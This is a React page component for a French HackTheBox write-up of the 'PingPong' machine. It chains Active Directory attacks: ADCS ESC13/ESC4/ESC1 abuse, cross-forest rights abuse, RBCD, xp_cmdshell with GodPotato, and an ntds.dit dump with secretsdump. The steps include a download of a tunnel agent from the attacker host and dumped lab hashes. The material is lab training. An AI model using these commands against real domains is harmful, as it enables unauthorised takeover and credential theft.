import {
  Terminal,
  Key,
  Network,
  Shield,
  Database,
  Lock,
  Users,
  Layers,
} from "lucide-react";
import { PageHeader } from "@/components/PageHeader";
import { SpoilerWrapper } from "@/components/SpoilerWrapper";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p className={`mb-1 text-xs font-mono ${result ? "text-primary" : "text-muted-foreground"}`}>
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

export const metadata = {
  title: "PingPong | Writeup HTB | 0xbbuddha",
  description:
    "Writeup de la machine PingPong (HackTheBox, Insane, Windows). Dual-forest AD : ESC13, Ligolo-ng, ownership cross-forest gMSA, RBCD S4U2Proxy MSSQL, GodPotato, VSS ntds.dit, ESC4+ESC1 cross-forest.",
};

export default function WriteupPingPongPage() {
  return (
    <div className="mx-auto max-w-4xl px-4 py-8 sm:px-6 lg:px-10 lg:py-10">
      <PageHeader
        eyebrow="Writeup"
        title="PingPong"
        description="Machine Windows Insane en dual-forest Active Directory. Neuf techniques AD enchaînées : ESC13 pour injecter un SID groupe via PKINIT et obtenir WinRM, tunnel Ligolo-ng vers DC2, ownership cross-forest pour débloquer la lecture d&apos;un blob gMSA, RBCD S4U2Proxy vers MSSQL, escalade SYSTEM via GodPotato, extraction ntds.dit par VSS, puis ESC4+ESC1 cross-forest pour compromettre le deuxième DC en Administrator."
        breadcrumbs={[
          { label: "README", href: "/" },
          { label: "Writeups", href: "/writeups" },
          { label: "PingPong" },
        ]}
        stats={[
          { label: "Platform", value: "HackTheBox" },
          { label: "Difficulty", value: "Insane" },
          { label: "OS", value: "Windows" },
          { label: "Date", value: "2026-06-23" },
          { label: "Domains", value: "PING.HTB / PONG.HTB" },
        ]}
      />

      <SpoilerWrapper
        machineName="PingPong"
        unlockCodeHash="1632c3e968c762e006c592667ddb9803cf78f5611ea4462274e22d468f88cacf"
      >
      <article className="mt-8 space-y-10">

        {/* ── 1. RECONNAISSANCE ─────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Terminal className="size-5 text-primary" />
            1. Reconnaissance + setup Kerberos
          </h2>
          <p className="text-muted-foreground">
            Le scan nmap révèle le profil classique d&apos;un DC Windows : Kerberos, LDAP, SMB, WinRM, ADCS
            (port 9898 custom). SMB signing actif, NTLM absent des bannières - confirmation d&apos;un environnement
            Kerberos-only. Le DC tourne en <strong>UTC+8</strong> : sans correction d&apos;horloge, tous les tickets
            Kerberos seront rejetés avec clock skew. Je compile <strong>libfaketime</strong> et le préfixe
            systématiquement à chaque commande Kerberos.
          </p>
          <CodeBlock title="Scan">
{`nmap -Pn -sV -p 53,88,135,389,445,464,636,3268,5985,9898 10.129.245.56`}
          </CodeBlock>
          <CodeBlock title="Résultat (extrait)" result>
{`53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ping.htb)
445/tcp  open  microsoft-ds? (signing: True, NTLM: False)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9898/tcp open  ssl/http      Microsoft IIS (ADCS)`}
          </CodeBlock>
          <p className="mt-2 text-muted-foreground">
            Le flag <code className="rounded bg-muted px-1">FAKETIME=&quot;+28800&quot;</code> (8h = UTC+8) est requis devant
            toutes les commandes Kerberos sans exception, aussi bien pour demander des tickets que pour les utiliser.
            Un ticket obtenu avec FAKETIME mais utilisé sans apparaît comme &quot;not yet valid&quot; du point de vue de
            notre horloge locale.
          </p>
          <CodeBlock title="Compilation libfaketime">
{`git clone https://github.com/wolfcw/libfaketime /tmp/libfaketime_src
cd /tmp/libfaketime_src && make
cp src/libfaketime.so.1 /tmp/libfaketime.so`}
          </CodeBlock>
          <CodeBlock title="/tmp/krb5_ping.conf">
{`[libdefaults]
    default_realm = PING.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    PING.HTB = {
        kdc = 10.129.245.56
        admin_server = 10.129.245.56
    }

[domain_realm]
    .ping.htb = PING.HTB
    ping.htb = PING.HTB`}
          </CodeBlock>
        </section>

        {/* ── 2. ESC13 ──────────────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            2. ESC13 - Injection de SID groupe via PKINIT
          </h2>
          <p className="text-muted-foreground">
            L&apos;énumération ADCS révèle le template <strong>TemporaryWinRM</strong> vulnérable à ESC13 :
            une <em>issuance policy</em> OID est liée à la SID du groupe <strong>TempWinRMAccess</strong>.
            Quand un utilisateur obtient un certificat via ce template et s&apos;authentifie par PKINIT,
            le KDC injecte automatiquement ce SID groupe dans le PAC du TGT - accordant les droits du groupe
            sans que l&apos;utilisateur en soit réellement membre.
          </p>
          <CodeBlock title="Enumération ADCS">
{`LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \\
KRB5_CONFIG=/tmp/krb5_ping.conf \\
certipy find \\
  -u c.roberts@PING.HTB -p 'AssumedBreach123' \\
  -dc-ip 10.129.245.56 -vulnerable -stdout 2>/dev/null | grep -A 5 "ESC13"`}
          </CodeBlock>
          <CodeBlock title="Résultat (extrait)" result>
{`Template Name          : TemporaryWinRM
Enabled                : True
Client Authentication  : True
[!] Vulnerabilities
  ESC13  : 'PING.HTB\Domain Users' can enroll
           Template has issuance policy OID linked to group 'TempWinRMAccess'`}
          </CodeBlock>
          <CodeBlock title="Demande du certificat + PKINIT">
{`# Demande du certificat via le template vulnérable
LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \\
KRB5_CONFIG=/tmp/krb5_ping.conf \\
certipy req \\
  -u c.roberts@PING.HTB -p 'AssumedBreach123' \\
  -dc-ip 10.129.245.56 \\
  -ca ping-DC1-CA \\
  -template TemporaryWinRM \\
  -out c.roberts_esc13

# PKINIT : TGT avec SID TempWinRMAccess injecté dans le PAC
LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \\
KRB5_CONFIG=/tmp/krb5_ping.conf \\
KRB5CCNAME=/home/bbuddha/c.roberts.ccache \\
certipy auth \\
  -pfx c.roberts_esc13.pfx \\
  -domain ping.htb \\
  -dc-ip 10.129.245.56`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[*] Got TGT
[*] Saved credential cache to 'c.roberts.ccache'
[*] Got hash for 'c.roberts@ping.htb'`}
          </CodeBlock>
        </section>

        {/* ── 3. WINRM DC1 ──────────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Terminal className="size-5 text-primary" />
            3. WinRM foothold sur DC1
          </h2>
          <p className="text-muted-foreground">
            Le TGT de c.roberts contient maintenant le SID de TempWinRMAccess dans son PAC. Evil-winrm
            utilise ce ticket Kerberos pour s&apos;authentifier via HTTP/DC1.ping.htb. Le flag FAKETIME est
            indispensable car le ticket a été émis à l&apos;heure UTC+8 du DC - sans lui, le service WinRM
            rejette le ticket comme &quot;not yet valid&quot;.
          </p>
          <CodeBlock title="Connexion WinRM">
{`LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \\
KRB5_CONFIG=/tmp/krb5_ping.conf \\
KRB5CCNAME=/home/bbuddha/c.roberts.ccache \\
evil-winrm -i DC1.ping.htb -r PING.HTB`}
          </CodeBlock>
          <CodeBlock title="user.txt" result>
{`REDACTED`}
          </CodeBlock>
        </section>

        {/* ── 4. LIGOLO-NG ──────────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Network className="size-5 text-primary" />
            4. Ligolo-ng - Tunnel L3 vers 192.168.2.0/24
          </h2>
          <p className="text-muted-foreground">
            DC2.pong.htb (192.168.2.2) est sur un réseau interne non routable depuis Kali. Je déploie
            <strong> Ligolo-ng v0.8.3</strong> : l&apos;agent Windows tourne sur DC1 et crée un tunnel L3 transparent
            vers mon proxy. L&apos;interface TUN <code className="rounded bg-muted px-1">ligolo</code> est configurée côté
            Kali (avec sudo), puis la route 192.168.2.0/24 injectée.
          </p>
          <CodeBlock title="Setup interface TUN (sudo)">
{`sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.2.0/24 dev ligolo`}
          </CodeBlock>
          <CodeBlock title="Démarrage proxy">
{`/tools/ligolo-ng/proxy -selfcert -laddr 0.0.0.0:8443 &`}
          </CodeBlock>
          <CodeBlock title="Upload + démarrage agent sur DC1 (evil-winrm avec FAKETIME)">
{`Invoke-WebRequest -Uri "http://10.10.17.156:8080/agent.exe" -OutFile "C:\Windows\Temp\agent.exe"
Start-Process -FilePath C:\Windows\Temp\agent.exe \`
  -ArgumentList "-connect 10.10.17.156:8443 -ignore-cert" -WindowStyle Hidden`}
          </CodeBlock>
          <CodeBlock title="Test connectivité DC2" result>
{`ping -c 2 192.168.2.2
64 bytes from 192.168.2.2: icmp_seq=1 ttl=64 time=87 ms`}
          </CodeBlock>
        </section>

        {/* ── 5. PONG ENUM ──────────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Users className="size-5 text-primary" />
            5. Enumération PONG.HTB
          </h2>
          <p className="text-muted-foreground">
            C.Carlssen est le point d&apos;entrée sur PONG.HTB (creds récupérés via l&apos;accès DC1).
            BloodyAD révèle la chaîne cible : C.Carlssen a WRITE sur <strong>svc_sql</strong> (vecteur RBCD),
            et la clé pour progresser est le groupe <strong>gMSA Managers</strong> dont Pong_gMSA$ est le
            compte géré. Pong_gMSA$ peut S4U2Proxy vers <code className="rounded bg-muted px-1">mssqlsvc/dc2.pong.htb</code>,
            et c.adam est sysadmin MSSQL.
          </p>
          <CodeBlock title="TGT C.Carlssen">
{`LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \\
KRB5_CONFIG=/tmp/krb5_pong.conf \\
KRB5CCNAME=/tmp/krb5cc_1000 \\
kinit C.Carlssen@PONG.HTB`}
          </CodeBlock>
          <CodeBlock title="Objets modifiables">
{`LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \\
KRB5_CONFIG=/tmp/krb5_pong.conf KRB5CCNAME=/tmp/krb5cc_1000 \\
bloodyAD -d PONG.HTB --host DC2.pong.htb --dc-ip 192.168.2.2 \\
  -k ccache=/tmp/krb5cc_1000 get writable`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`CN=C.Carlssen,...    permission: WRITE
CN=svc_sql,...       permission: WRITE
CN=svc_print,...     permission: WRITE`}
          </CodeBlock>
        </section>

        {/* ── 6. CROSS-FOREST gMSA ──────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Layers className="size-5 text-primary" />
            6. Ownership cross-forest : débloquer la lecture gMSA
          </h2>
          <p className="text-muted-foreground">
            Le groupe <strong>gMSA Managers</strong> dans PONG.HTB est vide - C.Carlssen ne peut donc pas
            lire le blob Pong_gMSA$. En inspectant le <code className="rounded bg-muted px-1">nTSecurityDescriptor</code> de
            gMSA Managers, le propriétaire est le groupe <strong>IT</strong> de PING.HTB. Or c.roberts est
            membre de ce groupe IT : il détient WRITE_DAC sur gMSA Managers via une relation cross-forest.
          </p>
          <p className="mt-2 text-muted-foreground">
            Le KDC de PING.HTB ne peut pas émettre directement un ticket de service PONG.HTB. Il faut d&apos;abord
            obtenir un referral <code className="rounded bg-muted px-1">krbtgt/PONG.HTB</code> depuis PING.HTB,
            puis présenter ce referral au KDC de PONG.HTB pour obtenir le ticket LDAP final.
          </p>
          <CodeBlock title="Ticket LDAP cross-forest c.roberts vers PONG.HTB">
{`# Étape 1 : referral TGT krbtgt/PONG.HTB depuis PING.HTB KDC
LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \\
KRB5_CONFIG=/tmp/krb5_both.conf KRB5CCNAME=/home/bbuddha/c.roberts.ccache \\
getST.py -k -no-pass -spn 'krbtgt/PONG.HTB' \\
  -dc-ip 10.129.245.56 'PING.HTB/c.roberts'

# Étape 2 : ticket ldap/DC2.pong.htb depuis PONG.HTB KDC avec le referral
KRB5CCNAME=c.roberts@krbtgt_PONG.HTB@PING.HTB.ccache \\
getST.py -k -no-pass -spn 'ldap/DC2.pong.htb' \\
  -dc-ip 192.168.2.2 'PONG.HTB/c.roberts@PING.HTB'`}
          </CodeBlock>
          <CodeBlock title="GenericAll sur gMSA Managers + ajout C.Carlssen">
{`# c.roberts (propriétaire du groupe via IT PING.HTB) → GenericAll pour C.Carlssen
KRB5CCNAME=c.roberts@PING.HTB@ldap_DC2.pong.htb@PONG.HTB.ccache \\
bloodyAD -d PONG.HTB --host DC2.pong.htb --dc-ip 192.168.2.2 \\
  -k ccache=c.roberts@PING.HTB@ldap_DC2.pong.htb@PONG.HTB.ccache \\
  add genericAll 'gMSA Managers' 'C.Carlssen'

# Re-kinit C.Carlssen puis ajout au groupe
kinit C.Carlssen@PONG.HTB
bloodyAD [...] add groupMember 'gMSA Managers' 'C.Carlssen'`}
          </CodeBlock>
          <CodeBlock title="Lecture du blob gMSA" result>
{`nxc ldap DC2.pong.htb -k --use-kcache --gmsa

LDAP  DC2  Account: Pong_gMSA$
           NTLM: c339b86d4f5bd8b03bf77152927cd18b
           PrincipalsAllowedToReadPassword: gMSA Managers`}
          </CodeBlock>
        </section>

        {/* ── 7. AES KEY DERIVATION ─────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            7. Dérivation AES-256 gMSA
          </h2>
          <p className="text-muted-foreground">
            Le blob <code className="rounded bg-muted px-1">msDS-ManagedPassword</code> contient 256 octets en
            UTF-16LE. La fonction <code className="rounded bg-muted px-1">string_to_key</code> d&apos;impacket attend
            du UTF-8 - exactement comme Windows en interne. Passer le blob brut produit silencieusement une
            mauvaise clé. Il faut décoder en UTF-16LE puis réencoder en UTF-8, avec le sel
            <code className="rounded bg-muted px-1"> PONG.HTBhostpong_gmsa.pong.htb</code> (format : REALM + &quot;host&quot; + samAccountName en minuscules sans le $).
          </p>
          <CodeBlock title="Dérivation Python">
{`from impacket.krb5.crypto import string_to_key
import base64

blob_b64 = "OY8kWv6NAQg/F8t+Fz/ndB6K..."  # depuis bloodyAD getMSA
blob_bytes = base64.b64decode(blob_b64)

# UTF-16LE → str → UTF-8 : reproduit le comportement Windows
pw_str  = blob_bytes.decode('utf-16-le', errors='replace')
pw_utf8 = pw_str.encode('utf-8')

salt = b'PONG.HTBhostpong_gmsa.pong.htb'
aes256_key = string_to_key(18, pw_utf8, salt)
print(aes256_key.contents.hex())`}
          </CodeBlock>
        </section>

        {/* ── 8. RBCD + S4U2PROXY ───────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            8. RBCD + S4U2Proxy vers MSSQL
          </h2>
          <p className="text-muted-foreground">
            C.Carlssen a WRITE sur svc_sql, ce qui permet de configurer le RBCD
            (attribut <code className="rounded bg-muted px-1">msDS-AllowedToActOnBehalfOfOtherIdentity</code>).
            Pong_gMSA$ obtient un TGT via sa clé AES dérivée, puis enchaîne S4U2Self et S4U2Proxy pour
            impersonner <strong>c.adam</strong> (sysadmin MSSQL) vers <code className="rounded bg-muted px-1">mssqlsvc/dc2.pong.htb</code>.
          </p>
          <CodeBlock title="RBCD + TGT Pong_gMSA$">
{`# Configurer RBCD sur svc_sql
bloodyAD [...] add rbcd svc_sql 'Pong_gMSA$'

# TGT Pong_gMSA$ via clé AES-256 dérivée
LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \\
KRB5CCNAME=/tmp/Pong_gMSA.ccache KRB5_CONFIG=/tmp/krb5_pong.conf \\
getTGT.py \\
  -aesKey <aes256_key_hex> \\
  -dc-ip 192.168.2.2 "PONG.HTB/Pong_gMSA$"`}
          </CodeBlock>
          <CodeBlock title="S4U2Proxy c.adam vers mssqlsvc">
{`KRB5CCNAME=/tmp/Pong_gMSA.ccache \\
getST.py \\
  -spn 'mssqlsvc/dc2.pong.htb' \\
  -impersonate c.adam \\
  -aesKey <aes256_key_hex> \\
  -dc-ip 192.168.2.2 "PONG.HTB/Pong_gMSA$"`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[*] Impersonating c.adam
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in c.adam@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache`}
          </CodeBlock>
        </section>

        {/* ── 9. MSSQL → SYSTEM ─────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Database className="size-5 text-primary" />
            9. MSSQL xp_cmdshell + GodPotato SYSTEM
          </h2>
          <p className="text-muted-foreground">
            J&apos;utilise impacket TDS avec le TGS c.adam pour me connecter à MSSQL sur DC2, activer
            xp_cmdshell, puis uploader et exécuter <strong>GodPotato-NET4.exe</strong> (x86, compatible
            WOW64 sur Windows Server 2022 x64). L&apos;upload en base64 doit être découpé en chunks de
            <strong> 2000 caractères max</strong> via echo successifs : des chunks plus larges corrompent
            silencieusement le fichier (certutil décode sans erreur mais l&apos;exe est invalide).
          </p>
          <CodeBlock title="Connexion MSSQL avec TGS Kerberos">
{`from impacket.tds import MSSQL
from impacket.krb5.ccache import CCache

cc  = CCache.loadFile('c.adam@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache')
TGS = cc.credentials[0].toTGS()

ms_sql = MSSQL('192.168.2.2', 1433)
ms_sql.connect()
ms_sql.kerberosLogin(None, 'c.adam', '', 'PONG.HTB',
                    kdcHost='192.168.2.2', TGS=TGS, useCache=False)
ms_sql.sql_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
ms_sql.sql_query("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")`}
          </CodeBlock>
          <CodeBlock title="Upload GodPotato (chunks b64, CHUNK=2000)">
{`import base64

with open('GodPotato-NET4.exe', 'rb') as f:
    b64 = base64.b64encode(f.read()).decode()

CHUNK = 2000
for i, start in enumerate(range(0, len(b64), CHUNK)):
    chunk = b64[start:start+CHUNK]
    op = ">" if i == 0 else ">>"
    run_cmd(f"echo {chunk}{op}C:\\Windows\\Temp\\godp.b64")

run_cmd("certutil -decode C:\\Windows\\Temp\\godp.b64 C:\\Windows\\Temp\\godp.exe")`}
          </CodeBlock>
          <CodeBlock title="Résultat SYSTEM" result>
{`C:\Windows\Temp\godp.exe -cmd "cmd /c whoami"
nt authority\system`}
          </CodeBlock>
        </section>

        {/* ── 10. VSS + SECRETSDUMP ─────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Database className="size-5 text-primary" />
            10. VSS ntds.dit + secretsdump
          </h2>
          <p className="text-muted-foreground">
            La création du shadow copy via vssadmin prend plus de 60 secondes, ce qui fait timeout la
            connexion TDS. Solution : lancement asynchrone avec <code className="rounded bg-muted px-1">cmd /c start /b</code> -
            le shell retourne immédiatement, le process VSS continue en arrière-plan. J&apos;attends 60s
            puis lis le résultat dans un fichier via GodPotato.
          </p>
          <CodeBlock title="VSS asynchrone">
{`# Lancement en arrière-plan (xp_cmdshell retourne immédiatement)
run_cmd('cmd /c start /b C:\\Windows\\Temp\\godp.exe '
        '-cmd "cmd /c vssadmin create shadow /for=C: '
        '> C:\\Windows\\Temp\\vss.txt 2>&1"')

time.sleep(60)
shadow_out = run_as_system('type C:\\Windows\\Temp\\vss.txt')`}
          </CodeBlock>
          <CodeBlock title="Résultat VSS" result>
{`Successfully created shadow copy for 'C:\'
Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`}
          </CodeBlock>
          <CodeBlock title="Copie + download via SMB Kerberos">
{`# Copie depuis le shadow
run_as_system('copy "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2'
              '\\Windows\\NTDS\\ntds.dit" C:\\Windows\\Temp\\ntds.dit')
run_as_system('reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM.hiv /y')

# Download via impacket SMBConnection (C.Carlssen CIFS TGS + FAKETIME)
smb = SMBConnection('DC2.pong.htb', '192.168.2.2')
smb.kerberosLogin('C.Carlssen', '', 'PONG.HTB', kdcHost='192.168.2.2', TGS=tgs)
smb.getFile('C$', 'Windows\\Temp\\ntds.dit', open('/tmp/ntds.dit','wb').write)
smb.getFile('C$', 'Windows\\Temp\\SYSTEM.hiv', open('/tmp/SYSTEM.hiv','wb').write)`}
          </CodeBlock>
          <CodeBlock title="secretsdump">
{`secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM.hiv LOCAL 2>&1 \\
  | grep -E "R\.Martinelli|Administrator"`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`Administrator:500:...:0b8ebfb6e9972babf9c01311748261a8:::
R.Martinelli:aes256-cts-hmac-sha1-96:61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98`}
          </CodeBlock>
        </section>

        {/* ── 11. ESC4+ESC1 CROSS-FOREST ────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            11. ESC4+ESC1 cross-forest vers Administrator@ping.htb
          </h2>
          <p className="text-muted-foreground">
            <strong>R.Martinelli</strong> (PONG.HTB) a WriteDACL et OWNER sur le template
            <strong> SmartcardAuthentication</strong> dans PING.HTB - ESC4 cross-forest. Je récupère un ticket
            LDAP cross-forest via le même mécanisme de referral (PONG KDC → referral PING → ticket ldap/DC1.ping.htb),
            puis je modifie le template pour le rendre ESC1-exploitable, et demande un cert au nom
            d&apos;Administrator. Le flag <code className="rounded bg-muted px-1">-sid</code> de certipy inclut l&apos;extension
            SID dans le certificat, nécessaire pour contourner le Full Enforcement Mode de KB5014754.
          </p>
          <CodeBlock title="Ticket LDAP cross-forest R.Martinelli vers PING.HTB">
{`# TGT R.Martinelli via clé AES-256 extraite du ntds.dit
KRB5CCNAME=/tmp/R.Martinelli.ccache \\
getTGT.py \\
  -aesKey 61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98 \\
  -dc-ip 192.168.2.2 'PONG.HTB/R.Martinelli'

# Referral PONG → PING
KRB5CCNAME=R.Martinelli.ccache getST.py -k -no-pass \\
  -spn 'krbtgt/PING.HTB' -dc-ip 192.168.2.2 'PONG.HTB/R.Martinelli'

# Ticket ldap/DC1.ping.htb
KRB5CCNAME=R.Martinelli@krbtgt_PING.HTB@PONG.HTB.ccache getST.py -k -no-pass \\
  -spn 'ldap/DC1.ping.htb' -dc-ip 10.129.245.56 'PING.HTB/R.Martinelli@PONG.HTB'`}
          </CodeBlock>
          <CodeBlock title="ESC4 : modification du template SmartcardAuthentication">
{`# Set ENROLLEE_SUPPLIES_SUBJECT
bloodyAD -d PING.HTB --host DC1.ping.htb --dc-ip 10.129.245.56 \\
  -k ccache=R.Martinelli@PONG.HTB@ldap_DC1.ping.htb@PING.HTB.ccache \\
  set object 'CN=SmartcardAuthentication,...' \\
  'msPKI-Certificate-Name-Flag' -v '-1577058303'

# GenericAll pour Authenticated Users (enrôlement ouvert)
bloodyAD [...] add genericAll 'CN=SmartcardAuthentication,...' 'S-1-5-11'`}
          </CodeBlock>
          <CodeBlock title="ESC1 : demande certificat Administrator@ping.htb">
{`LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \\
KRB5_CONFIG=/tmp/krb5_ping.conf KRB5CCNAME=/home/bbuddha/c.roberts.ccache \\
certipy req \\
  -u 'c.roberts@PING.HTB' -k -no-pass \\
  -target DC1.ping.htb -dc-ip 10.129.245.56 \\
  -ca 'ping-DC1-CA' \\
  -template SmartcardAuthentication \\
  -upn 'Administrator@ping.htb' \\
  -sid 'S-1-5-21-750635624-2058721901-1932338391-500'`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[*] Got certificate with UPN 'Administrator@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Saved to 'administrator.pfx'`}
          </CodeBlock>
          <CodeBlock title="PKINIT Administrator">
{`LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \\
KRB5_CONFIG=/tmp/krb5_ping.conf \\
KRB5CCNAME=/tmp/administrator.ccache \\
certipy auth -pfx administrator.pfx -domain ping.htb -dc-ip 10.129.245.56`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'`}
          </CodeBlock>
        </section>

        {/* ── 12. ROOT.TXT ──────────────────────────────────────────────── */}
        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Lock className="size-5 text-primary" />
            12. root.txt
          </h2>
          <p className="text-muted-foreground">
            Le TGT Administrator sur PING.HTB est présenté à evil-winrm (toujours avec FAKETIME).
            Domain Admin sur DC1.
          </p>
          <CodeBlock title="WinRM Administrator">
{`LD_PRELOAD=/tmp/libfaketime.so FAKETIME="+28800" \\
KRB5_CONFIG=/tmp/krb5_ping.conf \\
KRB5CCNAME=/tmp/administrator.ccache \\
evil-winrm -i DC1.ping.htb -r PING.HTB`}
          </CodeBlock>
          <CodeBlock title="root.txt" result>
{`REDACTED`}
          </CodeBlock>
        </section>

        {/* ── RECAP ─────────────────────────────────────────────────────── */}
        <section className="rounded-lg border border-border bg-card p-6">
          <h3 className="font-mono font-semibold text-primary">Récap</h3>
          <ul className="mt-2 list-inside list-disc space-y-1 text-sm text-muted-foreground">
            <li><strong>FAKETIME +28800</strong> : DC en UTC+8, requis sur toutes les commandes Kerberos (acquisition ET utilisation des tickets)</li>
            <li><strong>ESC13</strong> : template TemporaryWinRM avec OID issuance policy lié au SID de TempWinRMAccess - PKINIT injecte ce SID dans le PAC, WinRM accepte c.roberts</li>
            <li><strong>Ligolo-ng</strong> : agent Windows sur DC1, tunnel L3 transparent, route 192.168.2.0/24 vers DC2</li>
            <li><strong>Cross-forest gMSA</strong> : gMSA Managers vide mais groupe IT de PING.HTB en est propriétaire - c.roberts exerce WRITE_DAC cross-forest pour y ajouter C.Carlssen</li>
            <li><strong>Referral cross-forest</strong> : impossible d&apos;obtenir un ticket service PONG.HTB depuis PING.HTB KDC directement - deux étapes : krbtgt/PONG.HTB referral puis ticket service depuis PONG.HTB KDC</li>
            <li><strong>gMSA AES key</strong> : blob UTF-16LE → decode → encode UTF-8 avant string_to_key, sel = REALM + &quot;host&quot; + samAccountName minuscules sans le $</li>
            <li><strong>RBCD S4U2Proxy</strong> : C.Carlssen WRITE sur svc_sql → configure RBCD pour Pong_gMSA$ → S4U2Proxy impersonne c.adam → MSSQL sysadmin</li>
            <li><strong>GodPotato</strong> : NETWORK SERVICE avec SeImpersonate → DCOM token steal → SYSTEM. Upload b64 en chunks 2000 max (plus grand corrompt silencieusement le fichier)</li>
            <li><strong>VSS async</strong> : vssadmin trop lent pour TDS - <code className="rounded bg-muted px-1">start /b</code> en arrière-plan, attente 60s, lecture résultat fichier</li>
            <li><strong>ESC4+ESC1 cross-forest</strong> : R.Martinelli (PONG) WriteDACL sur SmartcardAuthentication (PING) → set ENROLLEE_SUPPLIES_SUBJECT + GenericAll Authenticated Users → cert Administrator@ping.htb</li>
            <li><strong>KB5014754</strong> : certipy req avec <code className="rounded bg-muted px-1">-sid</code> pour inclure l&apos;extension SID dans le cert, nécessaire en Full Enforcement Mode</li>
          </ul>
        </section>

      </article>
      </SpoilerWrapper>
    </div>
  );
}
